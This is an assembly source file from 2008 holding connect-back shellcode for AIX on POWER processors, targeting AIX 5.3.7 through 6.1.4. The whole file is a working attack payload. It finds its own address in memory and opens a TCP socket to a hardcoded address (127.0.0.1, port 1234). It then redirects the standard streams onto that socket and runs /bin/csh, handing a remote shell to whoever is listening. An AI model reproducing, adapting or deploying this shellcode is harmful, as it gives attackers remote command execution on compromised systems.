/*
 *  aix-power-cntsockcode.S
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Supported AIX versions:
 *
 * -DAIX614     AIX Version 6.1.4
 * -DAIX613     AIX Version 6.1.3
 * -DAIX612     AIX Version 6.1.2
 * -DAIX611     AIX Version 6.1.1
 * -DAIX5310    AIX Version 5.3.10
 * -DAIX539     AIX Version 5.3.9
 * -DAIX538     AIX Version 5.3.8
 * -DAIX537     AIX Version 5.3.7
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

syscallcode:
    # xor.    %r31,%r31,%r31
    xor.    %r5,%r5,%r5
    bnel    syscallcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r30,-511+36(%r30)
    mtctr   %r30
    bctr
    .long   0xff0204d2
    .long   0x7f000001
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    cal     %r30,-8(%r30)

cntsockcode:
    lil     %r29,__CAL

    # socket

    # xor     %r5,%r5,%r5
    cal     %r4,-__CAL+1(%r29)
    cal     %r3,-__CAL+2(%r29)
    cal     %r2,__NC_socket(%r29)
    mtctr   %r30
    bctrl
    mr      %r28,%r3

    # connect

    cal     %r5,-__CAL+16(%r29)
    cal     %r4,-8(%r30)
    cal     %r2,__NC_connect(%r29)
    mtctr   %r30
    bctrl

    # close

    cal     %r27,-__CAL+2(%r29)

0:
    mr      %r3,%r27
    cal     %r2,__NC_close(%r29)
    mtctr   %r30
    bctrl

    # kfcntl

    mr      %r5,%r27
    xor     %r4,%r4,%r4
    mr      %r3,%r28
    cal     %r2,__NC_kfcntl(%r29)
    mtctr   %r30
    bctrl

    ai.     %r27,%r27,-1
    bge     0b

shellcode:
    # lil     %r29,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    # mflr    %r30
    # cal     %r30,511(%r30)
    # cal     %r3,-511+40(%r30)
    # stb     %r5,-511+48(%r30)
    mflr    %r24
    cal     %r24,511(%r24)
    cal     %r3,-511+40(%r24)
    stb     %r5,-511+48(%r24)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    cal     %r2,__NC_execve(%r29)
    # crorc   %cr6,%cr6,%cr6
    # .long   0x44ffff02
    mtctr   %r30
    bctrl
    .asciz  "/bin/csh"

